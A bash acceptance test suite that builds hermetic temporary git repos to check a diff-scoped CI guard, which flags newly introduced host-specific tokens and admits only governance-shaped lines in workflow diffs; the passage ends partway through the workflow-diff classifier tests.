#!/usr/bin/env bash
# SPDX-FileCopyrightText: 2026 Munsik-Park
# SPDX-License-Identifier: Elastic-2.0
# ci-subject: .claude/hooks/check-autoflow-gate.sh .github/workflows/host-purity-delta.yml CLAUDE.md plugin/autoflow/hooks/check-autoflow-gate.sh scripts/test/check-host-purity-delta.sh tests/fixtures/host-purity-paths.txt tests/fixtures/host-purity-tokens.txt
# lane: standing
# budget-secs: SUITE_BUDGET_CEILING_SECS
# =============================================================================
# Test: diff-scoped host-purity DELTA guard — Issue #788
# =============================================================================
# Acceptance-suite RED->GREEN harness for
# scripts/test/check-host-purity-delta.sh, driven entirely by hermetic
# temp git repos (mktemp -d) via the --base/--head injection seam (DR-1).
# Dependency-free bash+git+grep+awk; no bats/yq/actionlint required — this is
# the CI-executed, RED-authored, GATE-gating suite per verification design
# §5.4 / feature §7 (plain-bash, no bats-install step).
#
# Acceptance criteria (Verification Design .autoflow/issue-788-verification-design.md,
# AC1-AC14):
#   AC1  New-token leak: an added '+' line carrying a denylist token in an
#        in-scope host-tool file -> exit 1, "LEAK: <file>:<lineno>: token '<t>'"
#        with the EXACT line number. Checked for two tokens (librechat, portone).
#   AC2  Diff-scoped: a token already present at the merge-base (unchanged
#        context) -> exit 0 (no false positive on pre-existing tokens).
#   AC3  A token appearing only on a REMOVED ('-') line -> exit 0 (deletion is
#        not an introduction).
#   AC4  Allowlist: a token added inside docs/adr/** does not trip the guard,
#        even in the same commit as a genuine host-tool leak (only the
#        host-tool file is flagged); a pure-allowlist commit -> exit 0.
#   AC5  Static: the in-scope path-pattern set is a standalone consumed
#        artifact (not inline literals) — asserted against
#        tests/fixtures/host-purity-paths.txt content, cross-checked against
#        CLAUDE.md's orchestrator-own-scope prose (pre-existing invariant).
#   AC6  Table-driven, all 5 seed tokens: positive (introduced -> flagged) +
#        boundary-aware negative near-miss (embedded substring -> NOT flagged).
#   AC7  Static: .github/workflows/host-purity-delta.yml exists, triggers on
#        pull_request + push:main, paths: covers the guard/config/test/
#        workflow files, fetch-depth 0, runs
#        `bash tests/test-issue-788-host-purity-delta.sh` with NO bats-install
#        step (Round-2 ratified plain-bash CI, no new runner infra).
#   AC8  Self-reference: running the guard against this branch's real diff
#        (base=origin/main) exits clean — the guard does not flag its own
#        fixtures/test file.
#   AC9  Structural: the --base/--head injection seam exists (verified both by
#        AC1-AC4 being expressible at all, and a light static grep that the
#        scanner source recognizes both flags).
#   AC10 NO-REGRESSION: the branch diff vs origin/main touches no lines of
#        .claude/hooks/check-autoflow-gate.sh nor the two live CI runner YAMLs.
#   AC11 Exit-code triad: 0 clean / 1 one-or-more leaks (all listed) / 2
#        usage-or-environment error (unresolvable --base, unknown flag).
#   AC12 Case-insensitive match: `LibreChat` and `LIBRECHAT` both trip (exit 1).
#   AC13 Pending-MOVE exemption: a token added under a decoupling-plan-§10
#        MOVE-tier path (scripts/webhook/**) does not trip the guard, even in
#        the same commit as a genuine non-exempt leak; a pure-MOVE-path commit
#        -> exit 0. Cross-checks the allow entries against the decoupling plan.
#   AC14 Rename edge: `git mv` of a file that already carries a pre-existing
#        token (no content change) -> exit 0 (a rename is not an introduction;
#        requires --find-renames in the scanner's diff invocation).
#
# RED expectation (Test-First — verification design §5):
#   AC1/AC2/AC3/AC4/AC6/AC7/AC9/AC11/AC12/AC13/AC14 FAIL — the guard script,
#   config fixtures, and CI workflow do not exist yet ("N red as designed").
#   AC5's CLAUDE.md cross-check sub-assertion and AC10 (diff confinement)
#   PASS as pre-existing invariants that hold before any implementation lands.
#   AC8 is expected FAIL/error (scanner absent) until GREEN.
# =============================================================================

set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"

SCANNER="$PROJECT_ROOT/scripts/test/check-host-purity-delta.sh"
TOKENS_FILE="$PROJECT_ROOT/tests/fixtures/host-purity-tokens.txt"
PATHS_FILE="$PROJECT_ROOT/tests/fixtures/host-purity-paths.txt"
WORKFLOW="$PROJECT_ROOT/.github/workflows/host-purity-delta.yml"

PASS=0; FAIL=0; SKIP=0; TESTS=0

# ---------------------------------------------------------------------------
# Helpers (assert_* pattern per tests/test-issue-794-doc-assertions.sh)
# ---------------------------------------------------------------------------

assert_eq() {
  local desc="$1" expected="$2" actual="$3"
  TESTS=$((TESTS + 1))
  if [[ "$expected" == "$actual" ]]; then
    echo "  PASS: $desc"
    PASS=$((PASS + 1))
  else
    echo "  FAIL: $desc (expected='$expected', got='$actual')"
    FAIL=$((FAIL + 1))
  fi
}

assert_true() {
  local desc="$1" condition="$2"
  TESTS=$((TESTS + 1))
  if eval "$condition"; then
    echo "  PASS: $desc"
    PASS=$((PASS + 1))
  else
    echo "  FAIL: $desc"
    FAIL=$((FAIL + 1))
  fi
}

assert_contains() {
  local desc="$1" haystack="$2" needle="$3"
  TESTS=$((TESTS + 1))
  if printf '%s' "$haystack" | grep -qF -- "$needle" 2>/dev/null; then
    echo "  PASS: $desc"
    PASS=$((PASS + 1))
  else
    echo "  FAIL: $desc (expected '$needle' not found)"
    FAIL=$((FAIL + 1))
  fi
}

assert_not_contains() {
  local desc="$1" haystack="$2" needle="$3"
  TESTS=$((TESTS + 1))
  if printf '%s' "$haystack" | grep -qF -- "$needle" 2>/dev/null; then
    echo "  FAIL: $desc (forbidden '$needle' found)"
    FAIL=$((FAIL + 1))
  else
    echo "  PASS: $desc"
    PASS=$((PASS + 1))
  fi
}

note_skip() {
  local desc="$1" reason="$2"
  TESTS=$((TESTS + 1))
  SKIP=$((SKIP + 1))
  echo "  SKIP: $desc ($reason)"
}

assert_nonempty() {
  local desc="$1" value="$2"
  TESTS=$((TESTS + 1))
  if [[ -n "$value" ]]; then
    echo "  PASS: $desc"
    PASS=$((PASS + 1))
  else
    echo "  FAIL: $desc (extraction produced an empty block)"
    FAIL=$((FAIL + 1))
  fi
}

# extract_paths <workflow-text-file> <pull_request|push>
# Per-block awk extractor (cycle-2 C2-AC1/AC2/AC5) — indentation-keyed: trigger
# key at col 2, `paths:` at col 4, `- '<glob>'` at col 6 (machine-stable in
# .github/workflows/host-purity-delta.yml).
extract_paths() {
  awk -v trig="$2" '
    $0 ~ "^  " trig ":$"                    { in_trig=1; in_paths=0; next }
    in_trig && /^  [a-zA-Z]/                 { in_trig=0 }
    in_trig && /^    paths:/                 { in_paths=1; next }
    in_trig && in_paths && /^    [a-zA-Z]/   { in_paths=0 }
    in_trig && in_paths && /^      - /       { print }
  ' "$1"
}

# ---------------------------------------------------------------------------
# Temp-repo harness (DR-1: hermetic, --base/--head injection, never a
# captured-diff pipe)
# ---------------------------------------------------------------------------

TMP_REPOS=()
cleanup_temp_repos() {
  local d
  for d in "${TMP_REPOS[@]:-}"; do
    [[ -n "$d" && -d "$d" ]] && rm -rf "$d"
  done
}
trap cleanup_temp_repos EXIT

make_temp_repo() {
  local dir
  dir="$(mktemp -d)"
  TMP_REPOS+=("$dir")
  git -C "$dir" init -q
  git -C "$dir" config user.email "red-test@example.invalid"
  git -C "$dir" config user.name "RED Test"
  echo "$dir"
}

# write_file <repo> <relpath> <content-with-real-newlines>
write_file() {
  local repo="$1" relpath="$2" content="$3"
  mkdir -p "$repo/$(dirname "$relpath")"
  printf '%s' "$content" > "$repo/$relpath"
}

# append_line <repo> <relpath> <line>
append_line() {
  local repo="$1" relpath="$2" line="$3"
  printf '%s\n' "$line" >> "$repo/$relpath"
}

commit_all() {
  local repo="$1" message="$2"
  git -C "$repo" add -A
  git -C "$repo" commit -q -m "$message"
}

# run_guard <repo> [scanner args...] -> sets GUARD_EXIT / GUARD_STDOUT / GUARD_STDERR
run_guard() {
  local repo="$1"; shift
  local out err
  out="$(mktemp)"; err="$(mktemp)"
  ( cd "$repo" && bash "$SCANNER" "$@" >"$out" 2>"$err" )
  GUARD_EXIT=$?
  GUARD_STDOUT="$(cat "$out" 2>/dev/null)"
  GUARD_STDERR="$(cat "$err" 2>/dev/null)"
  rm -f "$out" "$err"
}

BASE_HOST_FILE_CONTENT=$'#!/usr/bin/env bash\necho "line1"\necho "line2"\n'

# =============================================================================
echo "=== Pre-flight: implementation artifact presence (informational) ==="
[[ -f "$SCANNER" ]]      && echo "  present: $SCANNER"      || echo "  ABSENT (expected pre-GREEN): $SCANNER"
[[ -f "$TOKENS_FILE" ]]  && echo "  present: $TOKENS_FILE"  || echo "  ABSENT (expected pre-GREEN): $TOKENS_FILE"
[[ -f "$PATHS_FILE" ]]   && echo "  present: $PATHS_FILE"   || echo "  ABSENT (expected pre-GREEN): $PATHS_FILE"
[[ -f "$WORKFLOW" ]]     && echo "  present: $WORKFLOW"     || echo "  ABSENT (expected pre-GREEN): $WORKFLOW"

# =============================================================================
echo ""
echo "=== AC1: new-token leak detected, exact line number ==="

repo="$(make_temp_repo)"
write_file "$repo" "scripts/foo.sh" "$BASE_HOST_FILE_CONTENT"
commit_all "$repo" "base"
base_sha="$(git -C "$repo" rev-parse HEAD)"
append_line "$repo" "scripts/foo.sh" 'echo "librechat token"'
commit_all "$repo" "add librechat leak"
run_guard "$repo" --base "$base_sha" --head HEAD --tokens "$TOKENS_FILE" --paths "$PATHS_FILE"
assert_eq "AC1a: exit 1 on introduced 'librechat' token" "1" "$GUARD_EXIT"
assert_contains "AC1b: diagnostic names file:lineno + token (librechat)" \
  "$GUARD_STDERR" "LEAK: scripts/foo.sh:4: token 'librechat'"

repo2="$(make_temp_repo)"
write_file "$repo2" "scripts/foo.sh" "$BASE_HOST_FILE_CONTENT"
commit_all "$repo2" "base"
base_sha2="$(git -C "$repo2" rev-parse HEAD)"
append_line "$repo2" "scripts/foo.sh" 'echo "portone token"'
commit_all "$repo2" "add portone leak"
run_guard "$repo2" --base "$base_sha2" --head HEAD --tokens "$TOKENS_FILE" --paths "$PATHS_FILE"
assert_eq "AC1c: exit 1 on introduced 'portone' token (not a single hardcoded string)" "1" "$GUARD_EXIT"
assert_contains "AC1d: diagnostic names file:lineno + token (portone)" \
  "$GUARD_STDERR" "LEAK: scripts/foo.sh:4: token 'portone'"

# =============================================================================
echo ""
echo "=== AC2: diff-scoped — pre-existing token is not a false positive ==="

repo="$(make_temp_repo)"
write_file "$repo" "scripts/foo.sh" "${BASE_HOST_FILE_CONTENT}"
append_line "$repo" "scripts/foo.sh" 'echo "librechat pre-existing"'
commit_all "$repo" "base with pre-existing token"
base_sha="$(git -C "$repo" rev-parse HEAD)"
append_line "$repo" "scripts/foo.sh" 'echo "unrelated new line"'
commit_all "$repo" "unrelated addition"
run_guard "$repo" --base "$base_sha" --head HEAD --tokens "$TOKENS_FILE" --paths "$PATHS_FILE"
assert_eq "AC2: exit 0 — token unchanged since merge-base is not an introduction" "0" "$GUARD_EXIT"

# =============================================================================
echo ""
echo "=== AC3: removed line is not an introduction ==="

repo="$(make_temp_repo)"
write_file "$repo" "scripts/foo.sh" "${BASE_HOST_FILE_CONTENT}echo \"librechat to be removed\"\n"
commit_all "$repo" "base with token line"
base_sha="$(git -C "$repo" rev-parse HEAD)"
# Rewrite the file without the token line (a removal, not a mutation)
write_file "$repo" "scripts/foo.sh" "$BASE_HOST_FILE_CONTENT"
commit_all "$repo" "remove token line"
run_guard "$repo" --base "$base_sha" --head HEAD --tokens "$TOKENS_FILE" --paths "$PATHS_FILE"
assert_eq "AC3: exit 0 — removal of a token-bearing line is not flagged" "0" "$GUARD_EXIT"

# =============================================================================
echo ""
echo "=== AC4: allowlist (docs/adr/**) exemption ==="

repo="$(make_temp_repo)"
write_file "$repo" "scripts/foo.sh" "$BASE_HOST_FILE_CONTENT"
write_file "$repo" "docs/adr/9999-x.md" "# ADR\n\nSome text.\n"
commit_all "$repo" "base"
base_sha="$(git -C "$repo" rev-parse HEAD)"
append_line "$repo" "scripts/foo.sh" 'echo "librechat host leak"'
append_line "$repo" "docs/adr/9999-x.md" "Discusses librechat as a service."
commit_all "$repo" "host leak + allowlisted doc addition, same commit"
run_guard "$repo" --base "$base_sha" --head HEAD --tokens "$TOKENS_FILE" --paths "$PATHS_FILE"
assert_eq "AC4a: exit 1 — the non-allowlisted host file is still flagged" "1" "$GUARD_EXIT"
assert_contains "AC4b: scripts/foo.sh leak reported" "$GUARD_STDERR" "scripts/foo.sh"
assert_not_contains "AC4c: docs/adr/9999-x.md NOT reported (allowlist exemption)" \
  "$GUARD_STDERR" "docs/adr/9999-x.md"

repo2="$(make_temp_repo)"
write_file "$repo2" "docs/adr/9999-y.md" "# ADR\n\nSome text.\n"
commit_all "$repo2" "base"
base_sha2="$(git -C "$repo2" rev-parse HEAD)"
append_line "$repo2" "docs/adr/9999-y.md" "Discusses portone as a service."
commit_all "$repo2" "pure-allowlist commit"
run_guard "$repo2" --base "$base_sha2" --head HEAD --tokens "$TOKENS_FILE" --paths "$PATHS_FILE"
assert_eq "AC4d: exit 0 — a pure-allowlist commit is clean" "0" "$GUARD_EXIT"

# =============================================================================
echo ""
echo "=== AC5: scope list is a consumed artifact (static) ==="

assert_true "AC5a: scope/allowlist config file exists" "[ -f '$PATHS_FILE' ]"
paths_content=""
[[ -f "$PATHS_FILE" ]] && paths_content="$(cat "$PATHS_FILE")"
assert_contains "AC5b: config includes 'include scripts/**'" "$paths_content" "include scripts/**"
assert_contains "AC5c: config includes 'include .claude/hooks/**'" "$paths_content" "include .claude/hooks/**"
assert_contains "AC5d: config excludes 'exclude docs/**'" "$paths_content" "exclude docs/**"
assert_contains "AC5e: config excludes 'exclude .autoflow/**'" "$paths_content" "exclude .autoflow/**"
include_lines="$(printf '%s\n' "$paths_content" | grep -E '^include' || true)"
assert_not_contains "AC5f: docs/** is not itself an include-tier entry" "$include_lines" "docs/**"
# Pre-existing invariant — CLAUDE.md already names 'scripts/' as orchestrator
# own-scope; expected to PASS even pre-GREEN.
assert_true "AC5g: CLAUDE.md orchestrator-own-scope names 'scripts/' (cross-check root, pre-existing)" \
  "grep -qF 'scripts/' '$PROJECT_ROOT/CLAUDE.md'"

# =============================================================================
echo ""
echo "=== AC6: table-driven token match, boundary-aware (5 seed tokens) ==="

run_positive_negative() {
  local token="$1" positive_word="$2" negative_word="$3"
  local repo base_sha
  repo="$(make_temp_repo)"
  write_file "$repo" "scripts/foo.sh" "$BASE_HOST_FILE_CONTENT"
  commit_all "$repo" "base"
  base_sha="$(git -C "$repo" rev-parse HEAD)"
  append_line "$repo" "scripts/foo.sh" "echo \"$positive_word\""
  commit_all "$repo" "positive: $token"
  run_guard "$repo" --base "$base_sha" --head HEAD --tokens "$TOKENS_FILE" --paths "$PATHS_FILE"
  assert_eq "AC6 [$token] positive: introduced token trips the guard (exit 1)" "1" "$GUARD_EXIT"

  local repo2 base_sha2
  repo2="$(make_temp_repo)"
  write_file "$repo2" "scripts/foo.sh" "$BASE_HOST_FILE_CONTENT"
  commit_all "$repo2" "base"
  base_sha2="$(git -C "$repo2" rev-parse HEAD)"
  append_line "$repo2" "scripts/foo.sh" "echo \"$negative_word\""
  commit_all "$repo2" "negative near-miss: $token"
  run_guard "$repo2" --base "$base_sha2" --head HEAD --tokens "$TOKENS_FILE" --paths "$PATHS_FILE"
  assert_eq "AC6 [$token] negative: embedded substring near-miss does NOT trip (exit 0)" "0" "$GUARD_EXIT"
}

run_positive_negative "librechat"   "librechat token"    "xlibrechaty embedded"
run_positive_negative "jeungpyeong" "jeungpyeong token"   "myjeungpyeongish embedded"
run_positive_negative "cbnu"        "cbnu token"          "xcbnux embedded"
run_positive_negative "portone"     "portone token"       "xportonex embedded"
run_positive_negative "connev.io"   "connev.io token"     "xconnev.iox embedded"

# =============================================================================
echo ""
echo "=== AC7: CI wiring (static) — plain-bash, no bats-install step ==="
echo "    + cycle-2 drift guard: trigger paths (List A) ⊇ scanner include globs (List B)"

# n_inc is read from the paths-fixture regardless of workflow presence, so the
# absent-branch tally (C2-AC8) stays honest even when the workflow file itself
# is the thing that's missing.
n_inc="$(grep -cE '^include[[:space:]]' "$PATHS_FILE" 2>/dev/null || echo 0)"

if [[ ! -f "$WORKFLOW" ]]; then
  # Artifact absent is not vacuously green — bulk-fail its sub-assertions.
  # Canonical present-branch total (verification C2-AC8): 13 + 2*n_inc =
  # 9 cycle-1 fixed (AC7a-i) + 1 guard-own paths-fixture (AC7j) +
  # 2 shape guards (pr/push non-empty) + 1 negative sentinel probe +
  # 2*n_inc per-block include-glob membership (pull_request + push).
  k=$((13 + 2 * n_inc))
  TESTS=$((TESTS + k)); FAIL=$((FAIL + k))
  echo "  FAIL: $WORKFLOW not found — all $k AC7 sub-assertions fail (13 + 2*n_inc, n_inc=$n_inc)"
else
  wf_content="$(cat "$WORKFLOW")"
  assert_contains "AC7a: triggers on pull_request" "$wf_content" "pull_request:"
  assert_contains "AC7b: triggers on push to main" "$wf_content" "branches: [main]"
  assert_contains "AC7c: paths cover the scanner via scripts/**" "$wf_content" "- 'scripts/**'"
  assert_contains "AC7d: paths cover the token/scope fixtures" "$wf_content" "tests/fixtures/host-purity-tokens.txt"
  assert_contains "AC7e: paths cover the acceptance suite" "$wf_content" "tests/test-issue-788-host-purity-delta.sh"
  assert_contains "AC7f: checkout uses fetch-depth: 0 (merge-base needs history)" "$wf_content" "fetch-depth: 0"
  assert_contains "AC7g: run step invokes the plain-bash acceptance suite" \
    "$wf_content" "bash tests/test-issue-788-host-purity-delta.sh"
  assert_not_contains "AC7h: no bats-core/bats-action install step" "$wf_content" "bats-core"
  assert_not_contains "AC7i: no bats install step (setup-bats)" "$wf_content" "setup-bats"
  assert_contains "AC7j: paths-fixture is a guard-own trigger entry" "$wf_content" "tests/fixtures/host-purity-paths.txt"

  # --- Cycle-2 drift group (per-block, dynamic over include globs) ---
  pr_block="$(extract_paths "$WORKFLOW" pull_request)"
  push_block="$(extract_paths "$WORKFLOW" push)"
  assert_nonempty "AC7 drift: pull_request.paths extractable" "$pr_block"
  assert_nonempty "AC7 drift: push.paths extractable"         "$push_block"

  while IFS= read -r g; do
    [[ -z "$g" ]] && continue
    assert_contains "AC7 drift: pull_request.paths covers include glob '$g'" "$pr_block"   "- '$g'"
    assert_contains "AC7 drift: push.paths covers include glob '$g'"         "$push_block" "- '$g'"
  done < <(grep -E '^include[[:space:]]' "$PATHS_FILE" | awk '{print $2}')

  assert_not_contains "AC7 drift: sentinel glob absent from pull_request.paths" \
    "$pr_block" "- '__sentinel_never_mirrored__/**'"
fi

# =============================================================================
echo ""
echo "=== AC8: self-reference — guard against this branch's real diff is clean ==="

base_ref="$(git -C "$PROJECT_ROOT" merge-base HEAD origin/main 2>/dev/null \
  || git -C "$PROJECT_ROOT" rev-parse origin/main 2>/dev/null || true)"
if [[ -z "$base_ref" ]]; then
  note_skip "AC8: self-guard against real branch diff" "no merge-base with origin/main available"
else
  run_guard "$PROJECT_ROOT" --base "$base_ref" --head HEAD --tokens "$TOKENS_FILE" --paths "$PATHS_FILE"
  assert_eq "AC8: guard exits clean against its own introducing PR (allowlist covers self-reference)" \
    "0" "$GUARD_EXIT"
fi

# =============================================================================
echo ""
echo "=== AC9: injectable --base/--head seam (structural) ==="
# Behaviorally proven by AC1-AC4 each fixing an exact merge-base + single-commit
# delta via --base/--head on a hermetic temp repo (never a captured-diff pipe,
# per DR-1). This section adds a light static corroboration only.
assert_true "AC9a: scanner source recognizes --base flag" "grep -qF -- '--base' '$SCANNER' 2>/dev/null"
assert_true "AC9b: scanner source recognizes --head flag" "grep -qF -- '--head' '$SCANNER' 2>/dev/null"

# =============================================================================
echo ""
echo "=== AC10: NO-REGRESSION — diff confinement vs origin/main (pre-existing) ==="

if [[ -z "$base_ref" ]]; then
  note_skip "AC10a: check-autoflow-gate.sh untouched" "no merge-base with origin/main available"
  note_skip "AC10b: existing CI runner YAMLs untouched" "no merge-base with origin/main available"
else
  # #843: check-autoflow-gate.sh is now allowed to change (first intentional
  # engine-hook edit since #790 packaging) — but ONLY when the change lands
  # together with its plugin mirror. This still catches SILENT drift (an
  # untouched hook with a diverged mirror does not exist pre-#843 and stays
  # caught by the plain untouched check when no hook edit is in flight): the
  # arm passes on the pre-#843 untouched-hook invariant OR on the #843
  # parity-carried shape (hook changed AND plugin/autoflow/hooks mirror is
  # byte-identical to the host hook, per verify-package.sh AC5 parity).
  hook_diff="$(git -C "$PROJECT_ROOT" diff "$base_ref"..HEAD -- .claude/hooks/check-autoflow-gate.sh 2>/dev/null)"
  hook_untouched="no"; [[ -z "$hook_diff" ]] && hook_untouched="yes"
  hook_change_admitted="no"
  if [[ "$hook_untouched" == "yes" ]]; then
    hook_change_admitted="yes"
  elif cmp -s "$PROJECT_ROOT/.claude/hooks/check-autoflow-gate.sh" \
              "$PROJECT_ROOT/plugin/autoflow/hooks/check-autoflow-gate.sh" 2>/dev/null; then
    hook_change_admitted="yes"
  fi
  assert_eq "AC10a: check-autoflow-gate.sh untouched vs origin/main, OR changed with its plugin/autoflow/hooks mirror byte-identical (#843 parity-carried drift protection)" \
    "yes" "$hook_change_admitted"

  # unrecognized_added_lines_in_diff <diff-text>
  # Prints one line per ADDED ('+') line the admission predicate below does
  # NOT recognize. Classifies every added line against the union of:
  #   - blank / comment-only lines
  #   - the two #985 AC3-SPDX-COVERAGE header lines
  #   - #103's governance-only shape: a whole new "- id: select" step's
  #     body, admitted line-by-line against the EXACT shipped capture-then-
  #     check shape (cycle 2, ledger O15/O14, test round 3 option (i)) --
  #     NOT a blanket "anything deeper than the opener" admission. The
  #     cycle-1 form of this classifier admitted any line inside that block,
  #     which a negative arm below proves was a real hole (an injected curl
  #     line was silently admitted); "- name: reconcile selection against
  #     step outcomes" keeps the cycle-1 blanket block-scope admission
  #     unchanged -- untouched by cycle 2, out of this fix's scope --
  #     plus the three single-line guard-shape insertions into an EXISTING
  #     suite step ("id: s-<name>", "if: contains(format(...", "if:
  #     always()", "timeout-minutes: <N>"), plus an appended paths: glob
  #     list item -- ONLY inside a "paths:" block's own YAML scope (GATE:
  #     QUALITY quality-deduction finding: an earlier form admitted any
  #     `- '...'` line file-wide, broader than the stated paths-append
  #     scope of feature design §2.2) -- plus a "fetch-depth: 0" line, ONLY
  #     inside a checkout step's OWN "with:" block (cycle 2:
  #     fetch-depth-full-history, schema-hook-contract.yml), never file-wide.
  # Block scope (the reconcile-step opener block, the select-step body, the
  # checkout with: block, and the paths: block) is tracked over BOTH added
  # and context lines (not only '+' lines), because the existing markers a
  # governance insertion nests under ("- name: Run ...", "paths:", "uses:
  # actions/checkout@...") are themselves context lines in a purely
  # additive diff and must still close/open a prior block.
  unrecognized_added_lines_in_diff() {
    printf '%s\n' "$1" | grep -vE '^(diff --git|index |--- |\+\+\+ |@@ )' | awk '
      function indent_of(s,   i,n,c) {
        n = 0
        for (i = 1; i <= length(s); i++) {
          c = substr(s, i, 1)
          if (c == " ") n++; else break
        }
        return n
      }
      # is_select_body_line(c) -- the EXACT capture-then-check shape shipped
      # in schema-hook-contract.yml (and identically in every other selector-
      # consuming workflow), one clause per line. No wildcard/regex over the
      # body: a recognized-shape allowlist, not "anything in the block", is
      # the whole point of the cycle-2 tightening.
      function is_select_body_line(c) {
        if (c == "name: select suites for this change") return 1
        if (c == "run: |") return 1
        if (c == "rc=0") return 1
        if (c == "bash scripts/test/select-suites.sh --event \"$GITHUB_EVENT_NAME\" \\") return 1
        if (c == "> \"$RUNNER_TEMP/selected-raw.txt\" \\") return 1
        if (c == "2> \"$RUNNER_TEMP/selection-report.txt\" || rc=$?") return 1
        if (c == "cat \"$RUNNER_TEMP/selection-report.txt\"") return 1
        if (c == "if [ \"$rc\" -ne 0 ]; then") return 1
        if (c == "echo \"select-suites exited $rc — refusing to run with an unresolved selection\" >&2") return 1
        if (c == "exit \"$rc\"") return 1
        if (c == "fi") return 1
        if (c == "paste -sd" Q " " Q " - < \"$RUNNER_TEMP/selected-raw.txt\" > \"$RUNNER_TEMP/selected.txt\"") return 1
        if (c == "printf " Q "suites=%s\\n" Q " \"$(cat \"$RUNNER_TEMP/selected.txt\")\" >> \"$GITHUB_OUTPUT\"") return 1
        return 0
      }
      BEGIN { Q = sprintf("%c", 39) }
      {
        marker = substr($0, 1, 1)
        rest = substr($0, 2)
        ind = indent_of(rest)
        content = rest
        sub(/^[ \t]*/, "", content)

        select_opener = (content == "- id: select")
        reconcile_opener = (content == "- name: reconcile selection against step outcomes")
        opener = select_opener || reconcile_opener
        other_step_marker = (content ~ /^- (id|name):/) && !opener

        # Reconcile step -- cycle-1 blanket block-scope admission, unchanged.
        if (reconcile_opener) { deep_block = 1; deep_indent = ind }
        else if (other_step_marker) { deep_block = 0 }
        else if (deep_block && ind <= deep_indent) { deep_block = 0 }

        # Select step -- block scope TRACKS membership only; admission below
        # is per-line against is_select_body_line(), never blanket.
        if (select_opener) { sel_block = 1; sel_indent = ind }
        else if (other_step_marker) { sel_block = 0 }
        else if (sel_block && ind <= sel_indent) { sel_block = 0 }

        # Checkout step'"'"'s own with: block -- a "uses: actions/checkout@..."
        # line opens candidacy at its own indent; the immediately-following
        # "with:" line at that SAME indent (a step-body sibling key, not a
        # nested one) opens the with: scope, which closes the same way the
        # paths: block does below. Never file-wide: a fetch-depth: 0 line
        # belonging to some other checkout step, or sitting outside any
        # with: block, does not credit this arm.
        checkout_with_opener = 0
        if (content ~ /^uses: actions\/checkout@/) { checkout_uses_indent = ind; saw_checkout_uses = 1 }
        else if (saw_checkout_uses && content == "with:" && ind == checkout_uses_indent) { checkout_with = 1; checkout_with_indent = ind; saw_checkout_uses = 0; checkout_with_opener = 1 }
        else if (checkout_with && ind <= checkout_with_indent) { checkout_with = 0 }
        else if (other_step_marker) { saw_checkout_uses = 0 }

        # paths: block scope, tracked the same way -- a "paths:" key line
        # opens it at its own indent; any subsequent line (context or
        # added) closes it once the indent returns to <= the opening indent,
        # UNLESS that line is itself a fresh "paths:" opener.
        if (content == "paths:") { in_paths = 1; paths_indent = ind }
        else if (in_paths && ind <= paths_indent) { in_paths = 0 }

        if (marker != "+") next

        if (content == "") next
        if (content ~ /^#[[:space:]]*SPDX-FileCopyrightText:/) next
        if (content ~ /^#[[:space:]]*SPDX-License[-]Identifier:/) next
        if (content ~ /^#/) next
        if (reconcile_opener) next
        if (deep_block && ind > deep_indent) next
        if (select_opener) next
        if (sel_block && ind > sel_indent && is_select_body_line(content)) next
        if (content ~ /^id: s-[A-Za-z0-9_-]+$/) next
        if (content ~ /^if: contains\(format\(/) next
        if (content ~ /^if: always\(\)$/) next
        if (content ~ /^timeout-minutes: [0-9]+$/) next
        if (in_paths && ind > paths_indent && content ~ /^- \x27[^\x27]*\x27$/) next
        if (checkout_with_opener) next
        if (checkout_with && ind > checkout_with_indent && content == "fetch-depth: 0") next
        print $0
      }
    '
  }

  # Negative arm (falsifiability): the classifier above must still flag a
  # non-governance edit — a bogus added line that is none of blank, comment,
  # SPDX header, an admitted step block, or a guard-shape single-line
  # insertion. Run BEFORE using the classifier for real, so a vacuously
  # permissive predicate is caught here rather than silently passing AC10b.
  # (the trailing context line intentionally names no real suite path — a
  # literal "bash tests/<name>.sh" string spanning this fixture would itself
  # match check-suite-leaf.sh's command-position shape, since that lint reads
  # line by line and this fixture's quoting is not the same-line quoted-string
  # form its "ignored" row covers)
  NEGATIVE_ARM_DIFF='diff --git a/.github/workflows/fixture.yml b/.github/workflows/fixture.yml
index 0000000..1111111 100644
--- a/.github/workflows/fixture.yml
+++ b/.github/workflows/fixture.yml
@@ -1,2 +1,3 @@
       - name: Run schema↔hook contract test
+        env:
+          UNRELATED_SECRET: injected'
  NEGATIVE_ARM_UNRECOGNIZED="$(unrecognized_added_lines_in_diff "$NEGATIVE_ARM_DIFF" | grep -c .)"
  assert_true "AC10b negative arm: a non-governance addition (an unrelated 'env:' key) is NOT admitted by the governance-only classifier (got $NEGATIVE_ARM_UNRECOGNIZED unrecognized line(s))" \
    "[ \"$NEGATIVE_ARM_UNRECOGNIZED\" -gt 0 ]"

  # ---------------------------------------------------------------------
  # Cycle 2 (review-response) -- ledger O15/O14, test round 3 option (i):
  # the classifier's cycle-1 blanket block-scope admission for a NEW
  # "- id: select" step was tightened to a per-line recognized-shape
  # allowlist (is_select_body_line), because the blanket form admitted ANY
  # line inside that block -- the SELECT_BODY_NEGATIVE_DIFF arm below is
  # the falsifiability proof: it reproduces exactly that hole (an injected
  # curl line inside a brand-new select-step block) and confirms the
  # tightened classifier now catches it. SELECT_BODY_POSITIVE_DIFF confirms
  # the tightening did not lose the real, design-sanctioned body it exists
  # to admit. Same pairing for the checkout step's fetch-depth: 0 key,
  # block-scoped to its OWN with: block (never file-wide).
  # ---------------------------------------------------------------------
  SELECT_BODY_POSITIVE_DIFF='diff --git a/.github/workflows/fixture.yml b/.github/workflows/fixture.yml
index 0000000..1111111 100644
--- a/.github/workflows/fixture.yml
+++ b/.github/workflows/fixture.yml
@@ -1,2 +1,15 @@
       - name: Checkout
+      - id: select
+        name: select suites for this change
+        run: |
+          rc=0
+          bash scripts/test/select-suites.sh --event "$GITHUB_EVENT_NAME" \
+            > "$RUNNER_TEMP/selected-raw.txt" \
+            2> "$RUNNER_TEMP/selection-report.txt" || rc=$?
+          cat "$RUNNER_TEMP/selection-report.txt"
+          if [ "$rc" -ne 0 ]; then
+            echo "select-suites exited $rc — refusing to run with an unresolved selection" >&2
+            exit "$rc"
+          fi
+          paste -sd'"'"' '"'"' - < "$RUNNER_TEMP/selected-raw.txt" > "$RUNNER_TEMP/selected.txt"
+          printf '"'"'suites=%s\n'"'"' "$(cat "$RUNNER_TEMP/selected.txt")" >> "$GITHUB_OUTPUT"'
  SELECT_BODY_POSITIVE_UNRECOGNIZED="$(unrecognized_added_lines_in_diff "$SELECT_BODY_POSITIVE_DIFF" | grep -c .)"
